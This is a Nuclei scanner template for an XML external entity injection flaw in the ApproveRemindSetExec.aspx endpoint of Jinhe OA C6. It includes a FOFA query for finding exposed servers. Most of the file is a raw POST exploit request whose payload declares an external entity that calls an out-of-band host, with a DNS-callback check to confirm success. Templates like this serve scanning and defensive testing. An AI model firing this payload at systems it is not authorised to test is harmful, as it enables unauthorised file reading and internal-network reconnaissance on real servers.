id: jinhe-oa-approveremindsetexec-xxe
info:
  name: "金和 OA ApproveRemindSetExec.aspx 接口 XML 外部实体注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
          金和网络作为专业信息化服务商，提供包括金和OA在内的多种系统解决方案。该系统C6版本ApproveRemindSetExec.aspx接口存在XML外部实体注入漏洞，攻击者可通过构造恶意XML请求未经授权访问服务器敏感文件或实施内网服务探测，该漏洞可能被利用实现服务器文件读取及内网信息收集，最终导致系统控制权丧失。
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/Jhsoft.Web.AddMenu/ApproveRemindSetExec.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
    %remote;]>
    <root/>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
